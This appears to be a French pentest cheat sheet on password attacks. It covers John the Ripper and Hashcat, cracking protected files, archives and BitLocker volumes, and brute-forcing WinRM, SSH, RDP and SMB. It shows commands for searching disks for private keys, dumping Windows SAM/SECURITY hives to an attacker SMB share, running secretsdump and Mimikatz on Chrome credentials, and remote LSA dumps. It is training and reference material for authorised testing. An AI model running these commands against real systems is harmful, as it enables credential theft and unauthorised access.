# John The Ripper 

### Introduction

John the Ripper (john / JtR) est un outil open-source de référence pour le *password cracking* (brute-force, dictionnaire, etc.), avec de nombreux modes d’attaque et un support étendu de formats de hash.  
**Astuce** : Utiliser la version “jumbo” pour profiter de toutes les fonctionnalités.

## Modes d’attaque

### Single Crack Mode

**Utilise les infos du compte utilisateur (login, répertoire, GECOS) pour générer des mots de passe candidats.**
```bash
john --single <fichier_hash>
```
Exemple : Crack rapide basé sur les infos de l’utilisateur Linux (utile sur /etc/passwd ou /etc/shadow).

### Wordlist Mode (mode dictionnaire)

**Teste chaque mot d’un wordlist comme mot de passe candidat (attaque par dictionnaire).**
```bash
john --wordlist=<wordlist_file> <hash_file>
```
Possibilité d’ajouter `--rules` pour transformer les mots (capitalisation, ajouts de chiffres…).

### Incremental Mode (mode incrémental)

**Brute-force avancé basé sur des statistiques de mots de passe réels (Markov chain).**
```bash
john --incremental <hash_file>
```
Le plus exhaustif (et lent) : essaye toutes les combinaisons de caractères selon un charset défini.


## Identifier un format de hash

**Utilise hashid pour deviner le type de hash et obtenir la syntaxe John correspondante.**
```bash
hashid -j <hash>
```
Affiche tous les formats potentiels et la syntaxe --format=xxx à utiliser avec john.

### Spécifier le format de hash dans John

**Forcer le format de hash à utiliser si John ne détecte pas automatiquement.**
```bash
john --format=<format_john> <hash_file>
```

## Cracker des fichiers protégés (PDF, ZIP, RAR, etc.)

**Convertir un fichier en hash compatible John avec les outils *2john, puis cracker avec John.**
```bash
<tool> <fichier> > fichier.hash
john fichier.hash
```
Exemples d’outils :
- pdf2john, zip2john, rar2john, office2john, keepass2john, ssh2john, gpg2john, etc.

## Afficher les mots de passe crackés

**Afficher les résultats déjà trouvés par John.**
```bash
john --show <hash_file>
```
## Ressources complémentaires

- [Doc](https://github.com/openwall/john/tree/bleeding-jumbo/doc) (Openwall)
- [PentestMonkey hash formats](https://pentestmonkey.net/cheat-sheet/john-the-ripper-hash-formats)

# Hashcat

## Présentation

Hashcat est un puissant outil de *password cracking* multi-plateforme (Linux, Windows, macOS) optimisé GPU, supportant de nombreux formats de hash et modes d’attaque.  
Chaque mode ou format s’utilise via des options dédiées.


## Syntaxe Générale
```bash
hashcat -a <mode> -m <id_hash> <hashes> [wordlist, rule, mask, ...]
```

- `-a` : mode d’attaque (0 = dictionnaire, 3 = mask, etc.)
- `-m` : identifiant du type de hash (ex : 0 pour MD5, 1000 pour NTLM)
- `<hashes>` : fichier ou hash(s) à casser
- `[wordlist, rule, mask, ...]` : dépend du mode utilisé

## Identifier le type de hash

Lister tous les modes/ID supportés :
```bash
hashcat --help
```

## Dictionnaire (Dictionary Attack, -a 0)

Teste chaque mot du wordlist comme mot de passe candidat.
```bash
hashcat -a 0 -m <id_hash> <hash> <wordlist>
```

## Dictionnaire + Règles

Applique des transformations aux mots du wordlist pour générer plus de candidats.
```bash
hashcat -a 0 -m <id_hash> <hash> <wordlist> -r <fichier_regle>
```

Lister les règles disponibles :
```bash
ls /usr/share/hashcat/rules/
```

## Mask Attack (attaque par masque, -a 3)

Brute-force ciblé : définit le pattern de mot de passe à tester avec des masques.
```bash
hashcat -a 3 -m <id_hash> <hash> <mask>
```

**Symboles de masque principaux :**
- ?l : lettre minuscule
- ?u : lettre majuscule
- ?d : chiffre
- ?s : symbole spécial
- ?a : tous caractères imprimables

## Exemples d'options utiles

- Voir l’avancement :
```bash
hashcat --status
```

- Forcer l’utilisation CPU (au lieu de GPU) :
```bash
hashcat -D 1 ...
```
- Reprendre une session :
```bash
hashcat --restore
```

## Ressources utiles

- [Liste complète des hash modes Hashcat](https://hashcat.net/wiki/doku.php?id=example_hashes)
- [Hashcat rules documentation](https://hashcat.net/wiki/doku.php?id=rule_based_attack)


---

# Cracking Protected Files

## Trouver des fichiers chiffrés / protégés

Rechercher les fichiers à extensions courantes (Office, PDF, etc.) sur un système Linux :
```bash
for ext in $(echo ".xls .xls* .xltx .od* .doc .doc* .pdf .pot .pot* .pp*"); do
echo -e "\nFile extension: $ext"
find / -name *$ext 2>/dev/null | grep -v "lib|fonts|share|core"
done
```
*Cherche sur tout le disque les fichiers de type document potentiellement chiffrés/protégés.*

## Trouver des clés SSH privées

Chercher des clés SSH privées par leur entête (HEADER) :
```bash
grep -rnE '^-{5}BEGIN [A-Z0-9]+ PRIVATE KEY-{5}$' /* 2>/dev/null
```
*Repère tous les fichiers contenant une clé privée (RSA, ED25519, etc.).*

## Vérifier si une clé SSH est chiffrée

Lire la clé pour voir si elle demande une passphrase :
```bash
ssh-keygen -yf ~/.ssh/id_rsa
```

*Si elle est protégée, un prompt passphrase apparaît. Sinon, la clé publique s’affiche.*

## Extraire un hash depuis un fichier protégé (avec *2john)

Extraire le hash :
```bash
ssh2john.py SSH.private > ssh.hash
```

Cracker avec John :
```bash
john --wordlist=rockyou.txt ssh.hash
```

Afficher les résultats :
```bash
john ssh.hash --show
```

### Exemple : Cracker un document Office

Extraire le hash :
```bash
office2john.py Protected.docx > protected-docx.hash
```

Cracker : 
```bash
john --wordlist=rockyou.txt protected-docx.hash
```

### Exemple : Cracker un PDF protégé

Extraire le hash :
```bash
pdf2john.py PDF.pdf > pdf.hash
```

Cracker : 
```bash
john --wordlist=rockyou.txt pdf.hash
```

# Cracking Protected Archives

## Identifier les types d’archives courants

Lister toutes les extensions d’archives reconnues par FileInfo :
```bash
curl -s https://fileinfo.com/filetypes/compressed | html2text | awk '{print tolower($1)}' | grep "." | tee -a compressed_ext.txt
```
*Génère une liste de toutes les extensions d’archives connues et l’enregistre dans `compressed_ext.txt`.*


## Cracker les fichiers ZIP protégés

Extraire le hash du ZIP avec zip2john et cracker :
```bash
zip2john ZIP.zip > zip.hash
```
```bash
john --wordlist=rockyou.txt zip.hash
```

## Cracker les fichiers GZIP chiffrés avec OpenSSL

Identifier le fichier :
```bash
file GZIP.gzip
```
*Exemple de résultat :*  
`GZIP.gzip: openssl enc'd data with salted password`

Bruteforce avec wordlist (boucle shell) :
```bash
for i in $(cat rockyou.txt); do
openssl enc -aes-256-cbc -d -in GZIP.gzip -k $i 2>/dev/null | tar xz
done
```
*Ignore les erreurs. Si le bon mot de passe est trouvé, les fichiers sont extraits dans le dossier courant.*

## Cracker un disque chiffré BitLocker

Extraire les hashs depuis le disque virtuel (ex : .vhd) :
```bash
bitlocker2john -i Backup.vhd > backup.hashes
grep "bitlocker$0" backup.hashes > backup.hash
cat backup.hash
```

Craquer le hash BitLocker avec hashcat :
```bash
hashcat -a 0 -m 22100 <hash_bitlocker> <wordlist>
```

## Monter un disque BitLocker cracké

### Sous Windows

- Double-cliquer sur le `.vhd` : montez le disque.
- Double-cliquer sur le volume BitLocker : saisir le mot de passe cracké.

### Sous Linux (ou macOS) avec dislocker

Installer dislocker :
```bash
sudo apt-get install dislocker
```

Créer les dossiers de montage :
```bash
sudo mkdir -p /media/bitlocker
sudo mkdir -p /media/bitlockermount
```

Associer le .vhd à un loop device :
```bash
sudo losetup -f -P Backup.vhd
```

Déchiffrer la partition (remplacer `/dev/loop0p2` par la partition réelle, et `1234qwer` par le mot de passe trouvé) :
```bash
sudo dislocker /dev/loop0p2 -u1234qwer -- /media/bitlocker
```

Monter le disque déchiffré :
```bash
sudo mount -o loop /media/bitlocker/dislocker-file /media/bitlockermount
```

Parcourir le contenu :
```bash
cd /media/bitlockermount/
ls -la
```

## Ressources utiles

- [Liste des types d’archives (FileInfo)](https://fileinfo.com/filetypes/compressed)
- [Dislocker (outil BitLocker Linux)](https://github.com/Aorimn/dislocker)
- [zip2john, bitlocker2john sur le dépôt John the Ripper](https://github.com/openwall/john/tree/bleeding-jumbo/run)


---

# Network Services

## Généralités

Sur un réseau, les services comme FTP, SMB, NFS, IMAP/POP3, SSH, MySQL/MSSQL, RDP, WinRM, VNC, Telnet, SMTP et LDAP sont souvent exposés à l’attaque par mot de passe.  
Outils principaux : **NetExec**, **Hydra**, **Evil-WinRM**, **Metasploit**, **smbclient**, etc.

---

## WinRM

### Découverte & Brute Force (NetExec)
Outil polyvalent pour brute-force et post-exploitation sur de nombreux protocoles (SMB, WinRM, SSH, etc).

**Installation :**
```bash
sudo apt-get -y install netexec
```
Lister les options globales :
```bash
netexec -h
```

Attaquer un endpoint WinRM (bruteforce) :
```bash
netexec winrm <IP> -u <user|userlist> -p <pass|passlist>
```
*Le tag (Pwn3d!) dans la sortie indique un compte compromis.

## Brute Force de protocoles 
### SSH
Brute Force avec Hydra : 
```bash
hydra -L user.list -P password.list ssh://<IP>
```

### RDP (Remote Desktop Protocol)
Brute Force avec Hydra :
```bash
hydra -L user.list -P password.list rdp://<IP>
```

### SMB
Brute Force avec Hydra : 
```bash
hydra -L user.list -P password.list smb://<IP>
```

** Metasploit peut aussi brute force certains protocoles **

--- 

# Attacking SAM, SYSTEM, and SECURITY

## Registry Hives

| Hive                | Description                                                                          |
|---------------------|--------------------------------------------------------------------------------------|
| HKLM\SAM            | Password hashes des comptes locaux                                                   |
| HKLM\SYSTEM         | Clé de démarrage du système, nécessaire pour décrypter le SAM                        |
| HKLM\SECURITY       | Informations sensibles de LSA : caches DCC2, DPAPI keys, cleartext, etc.             |


## Dumper les hives localement

Ouvrir une invite **cmd.exe** en admin :
```bash
reg.exe save hklm\sam C:\sam.save
reg.exe save hklm\system C:\system.save
reg.exe save hklm\security C:\security.save
```

*Crée `sam.save`, `system.save`, `security.save` sur le système cible.*

## Transférer les hives sur l’attaquant

### Lancer un partage SMB sur l’attaquant

```bash
sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py -smb2support CompData /home/<user>/Documents/
```


### Copier les fichiers depuis la machine Windows

```bash
move C:\sam.save \<IP_attacker>\CompData
move C:\system.save\<IP_attacker>\CompData
move C:\security.save \<IP_attacker>\CompDatah
```

## Dumper les hashes avec secretsdump (Impacket)
```bash
python3 /usr/share/doc/python3-impacket/examples/secretsdump.py
-sam sam.save -system system.save -security security.save LOCAL
```

*Affiche bootKey, SAM hashes, DCC2, LSA secrets, DPAPI keys, etc.*

## Cracker les NT hashes avec Hashcat

1. Extraire les NT hashes (colonne `nthash`) dans un fichier `hashes.txt`.  
2. Lancer Hashcat mode 1000 (NTLM) :
```bash
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt
```

## Cracker les DCC2 hashes (cached domain creds)
```bash
hashcat -m 2100 '$DCC2$10240#administrator#23d97555681813db79b2ade4b4a6ff25'
/usr/share/wordlists/rockyou.txt
```

*Mode 2100 – PBKDF2-based, beaucoup plus lent que NTLM.*

## Déchiffrer les DPAPI blobs (ex : Chrome)

Avec Mimikatz :
```bash
mimikatz.exe
dpapi::chrome /in:"C:\Users<user>\AppData\Local\Google\Chrome\User Data\Default\Login Data" /unprotect
```

*Récupère la clé AES puis les credentials stockés.*

## Dump à distance via NetExec

### LSA secrets
```bash
netexec smb <IP> --local-auth -u <user> -p <pass> --lsa
```

### SAM hashes
```bash
netexec smb <IP> --local-auth -u <user> -p <pass> --sam
```

*Permet de dumper SAM et LSA secrets sans accès physique.*











































